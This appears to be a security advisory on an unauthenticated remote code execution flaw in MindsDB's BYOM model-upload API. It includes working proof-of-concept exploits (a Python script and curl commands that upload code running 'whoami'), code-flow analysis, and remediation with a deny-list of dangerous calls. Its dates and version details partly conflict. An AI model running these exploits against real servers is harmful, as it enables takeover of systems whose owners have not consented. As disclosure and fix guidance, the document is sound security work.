# MindsDB BYOM Remote Code Execution Vulnerability

## Executive Summary

| Property | Value |
|----------|-------|
| **Vulnerability Name** | BYOM (Bring Your Own Model) Remote Code Execution |
| **Affected Versions** | MindsDB < 25.11.1 |
| **Fixed Version** | 25.11.1 |
| **Vulnerability Type** | RCE (Remote Code Execution) |
| **Severity** | **High** |
| **CWE** | CWE-913 (Improper Control of Dynamically-Managed Code Resources) |
| **Author** | Vulnerability Analyzer |

## Vulnerability Description

MindsDB's BYOM (Bring Your Own Model) feature allows users to upload custom Python model code through the HTTP API. The uploaded code is executed directly via `exec()` during engine creation without any validation or sandboxing.

**Key Issues:**
- Code is executed via `exec()` during engine creation
- No authentication required (default configuration)
- Single HTTP PUT request achieves RCE
- Code executes in the same process as the MindsDB server

## Affected Products

| Product | Version |
|---------|---------|
| MindsDB | < 25.11.1 |

## Environment Setup

```bash
# 1. Clone vulnerable version
git clone https://github.com/mindsdb/mindsdb.git
cd mindsdb
git checkout v25.11.0

# 2. Install
pip install -e .

# 3. Start HTTP API
python -m mindsdb --api=http
```

The service will start on `http://127.0.0.1:47334`.

## Proof of Concept

### Method 1: Python Script

```python
#!/usr/bin/env python3
import requests

TARGET = "http://127.0.0.1:47334"

# Malicious code - executes system commands
MALICIOUS_CODE = """import os
import subprocess

# Execute system command
result = subprocess.run(['whoami'], capture_output=True, text=True)

# Write proof
with open('/tmp/byom_rce_proof.txt', 'w') as f:
    f.write('BYOM RCE SUCCESS!\\nWHOAMI: ' + result.stdout)

# Required Model class
class MyModel:
    def train(self, df, target, args=None):
        return self
    def predict(self, df, args=None):
        return df
"""

files = {
    'code': ('model.py', MALICIOUS_CODE, 'text/plain'),
    'modules': ('requirements.txt', 'pandas\\n', 'text/plain'),
}

data = {'type': 'inhouse'}

# Upload and trigger RCE
response = requests.put(
    f"{TARGET}/api/handlers/byom/pwned",
    files=files,
    data=data,
    timeout=30
)

print(f"Status: {response.status_code}")
if response.status_code == 200:
    print("[!] RCE triggered - check /tmp/byom_rce_proof.txt")
```

### Method 2: curl Command

```bash
# Create malicious code file
cat > model.py << 'EOF'
import os, subprocess
result = subprocess.run(['whoami'], capture_output=True, text=True)
open('/tmp/pwned.txt', 'w').write('PWNED: ' + result.stdout)

class MyModel:
    def train(self, df, target, args=None): return self
    def predict(self, df, args=None): return df
EOF

# Create requirements file
echo "pandas" > requirements.txt

# Upload and exploit
curl -X PUT http://127.0.0.1:47334/api/handlers/byom/pwned \
  -F 'code=@model.py' \
  -F 'modules=@requirements.txt' \
  -F 'type=inhouse'

# Verify
cat /tmp/pwned.txt
# Output: PWNED: <username>
```

## Vulnerability Analysis

### Data Flow Overview

```
PUT /api/handlers/byom/<name>
        │
        ▼
┌─────────────────────────────────────────────────────────────┐
│ 1. prepare_formdata()                                       │
│    Parse multipart, save uploaded code to temp file         │
└─────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. CreateMLEngine → integration_controller.add()            │
│    Read temp file content, pass to byom_handler             │
└─────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. byom_handler.create_engine()                             │
│    Call _get_model_proxy() to create ModelWrapperUnsafe      │
└─────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. ModelWrapperUnsafe.__init__()                            │
│    Call import_string(code)                                 │
└─────────────────────────────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────────────────────────────┐
│ 5. import_string() → exec(code, module.__dict__)  ← RCE     │
│    Direct execution of user-provided Python code             │
└─────────────────────────────────────────────────────────────┘
```

### Key Vulnerable Code

#### 1. HTTP Entry Point - No Authentication

**File**: `mindsdb/api/http/namespaces/handlers.py:204-240`

```python
@ns_conf.route("/byom/<name>")
class BYOMUpload(Resource):
    def put(self, name):
        # No authentication check
        params = prepare_formdata()

        code_file_path = params["code"]
        connection_args = {
            "code": code_file_path,
            "type": params.get("type")  # "inhouse" = execute in current process
        }

        ast_query = CreateMLEngine(
            name=Identifier(name),
            handler="byom",
            params=connection_args
        )
        command_executor.execute_command(ast_query)
        return "", 200
```

**Security Issues**:
- No authentication check
- No authorization validation
- Direct pass-through of user file path to create_engine

#### 2. Code Execution - import_string()

**File**: `mindsdb/integrations/handlers/byom_handler/proc_wrapper.py:74-82`

```python
def import_string(code, module_name='model'):
    import types
    module = types.ModuleType(module_name)

    # Direct execution of user-provided Python code
    exec(code, module.__dict__)

    return module
```

**Security Issues**:
- No code validation or filtering
- No sandbox or isolation
- Direct use of `exec()` on arbitrary code
- User code can:
  - Import arbitrary modules
  - Execute system commands
  - Read/write files
  - Make network requests
  - Steal sensitive data

#### 3. Current Process Execution - ModelWrapperUnsafe

**File**: `mindsdb/integrations/handlers/byom_handler/byom_handler.py:384-394`

```python
class ModelWrapperUnsafe:
    """Model wrapper that executes learn/predict in current process"""

    def __init__(self, code, modules_str, engine_id, engine_version: int):
        # Code is executed during initialization
        self.module = import_string(code)

        model_class = find_model_class(self.module)
        if model_class is not None:
            model_instance = model_class()

        self.model_instance = model_instance
```

**Security Issues**:
- `ModelWrapperUnsafe` executes in the **same process** as MindsDB
- Code has access to all Python built-ins and modules
- No resource limits or isolation

### PoC Code vs Execution Flow

#### Attacker's Malicious Code

```python
import os
import subprocess

# === Following code executes immediately when exec() is called ===

# 1. Execute system command
result = subprocess.run(['whoami'], capture_output=True, text=True)

# 2. Write result to file
with open('/tmp/pwned.txt', 'w') as f:
    f.write('PWNED: ' + result.stdout)

# === Following is the required Model class ===

class MyModel:
    def train(self, df, target, args=None):
        return self
    def predict(self, df, args=None):
        return df
```

#### Execution Flow

| Step | Code Location | What Happens | Malicious Code State |
|------|--------------|--------------|---------------------|
| 1 | `handlers.py:put()` | Receive HTTP PUT request | Code in HTTP request |
| 2 | `prepare_formdata()` | Parse multipart, save to temp | Code written to temp file |
| 3 | `integration_controller.add()` | Read temp file content | Code loaded into memory |
| 4 | `byom_handler.create_engine()` | Call `_get_model_proxy()` | Preparing execution |
| 5 | `_get_model_proxy()` | Create `ModelWrapperUnsafe` | Preparing execution |
| 6 | `ModelWrapperUnsafe.__init__()` | Call `import_string(code)` | Code passed to exec() |
| 7 | `import_string()` | **`exec(code, module.__dict__)`** | **Code executed!** |

#### How exec() Executes the Code

```python
def import_string(code, module_name='model'):
    import types
    module = types.ModuleType(module_name)
    # module = <module 'model'> (empty module)
    # module.__dict__ = {}

    # Execute user code
    exec(code, module.__dict__)
    #
    # exec() execution process:
    #
    # 1. import os, subprocess
    #    → module.__dict__['os'] = <module 'os'>
    #    → module.__dict__['subprocess'] = <module 'subprocess'>
    #
    # 2. result = subprocess.run(['whoami'], ...)
    #    → subprocess.run() is called
    #    → whoami command executes on system
    #    → result = "username\n"
    #
    # 3. with open('/tmp/pwned.txt', 'w') as f: ...
    #    → Opens /tmp/pwned.txt
    #    → Writes "PWNED: username"
    #    → File is created
    #
    # 4. class MyModel: ...
    #    → MyModel class is defined
    #    → module.__dict__['MyModel'] = <class 'MyModel'>

    return module
```

## Impact

| Aspect | Description |
|--------|-------------|
| **Attack Vector** | Network-adjacent (HTTP API) |
| **Attack Complexity** | Low (single HTTP request) |
| **Privileges Required** | None (default configuration) |
| **User Interaction** | None |
| **Scope** | Changed (code executes in server process) |
| **Confidentiality** | High (sensitive data can be stolen) |
| **Integrity** | High (data can be modified/deleted) |
| **Availability** | High (server can be crashed) |

**Consequences**:
- Complete server compromise
- Data exfiltration
- Lateral movement within network
- Persistent backdoor installation

## Remediation

### Recommended Fix

1. **Add Authentication and Authorization**

```python
# Add authentication decorator
@auth_required
@admin_required  # BYOM should require admin privileges
def put(self, name):
    # ... existing code
```

2. **Implement Code Validation**

```python
def review_byom_code(code: str) -> bool:
    """Static analysis of BYOM code"""
    dangerous_patterns = [
        'subprocess', 'os.system', 'eval', 'exec',
        '__import__', 'pickle', 'marshal', 'compile'
    ]

    import ast
    try:
        tree = ast.parse(code)
        for node in ast.walk(tree):
            # Check for dangerous imports
            if isinstance(node, (ast.Import, ast.ImportFrom)):
                for alias in node.names:
                    if alias.name.split('.')[0] in dangerous_patterns:
                        raise SecurityError(f"Dangerous import: {alias.name}")
            # Check for dangerous function calls
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    if node.func.id in dangerous_patterns:
                        raise SecurityError(f"Dangerous function: {node.func.id}")
    except Exception as e:
        raise SecurityError(f"Code validation failed: {e}")

    return True
```

3. **Use Sandboxed Execution**

```python
def import_string_safe(code, module_name='model'):
    import types
    import ast

    # Validate code first
    review_byom_code(code)

    # Create restricted environment
    module = types.ModuleType(module_name)
    safe_globals = {
        '__builtins__': {
            'print': print,
            'range': range,
            'len': len,
            # ... only safe built-ins
        }
    }

    exec(code, safe_globals, module.__dict__)
    return module
```

4. **Use Process Isolation**

```python
class ModelWrapperSandboxed:
    """Model wrapper that executes in isolated process"""

    def __init__(self, code, modules_str, engine_id, engine_version: int):
        # Always use venv/subprocess isolation
        self.code = code
        self.prepare_env()
        # Code is executed in isolated process, not current process
```

## Timeline

| Date | Event |
|------|-------|
| 2025-01-14 | Vulnerability discovered |
| 2025-01-14 | Vendor notification |
| TBD | Patch released (v25.11.1) |
| TBD | CVE assigned |

## References

- **Product**: https://github.com/mindsdb/mindsdb
- **Documentation**: https://docs.mindsdb.com/advanced/byom
- **Related CVE**: CVE-2025-6847 (Path Traversal - can be combined with this issue)

## Disclaimer

This report is provided for security research and educational purposes only. All testing was conducted in authorized environments.

- Do not use this information for any illegal purposes
- The exploit methods described are intended to help understand and fix security vulnerabilities
- Users are responsible for any consequences resulting from the use of this information

---

**Contact**: Vulnerability Analyzer
**Date**: 2025-01-14
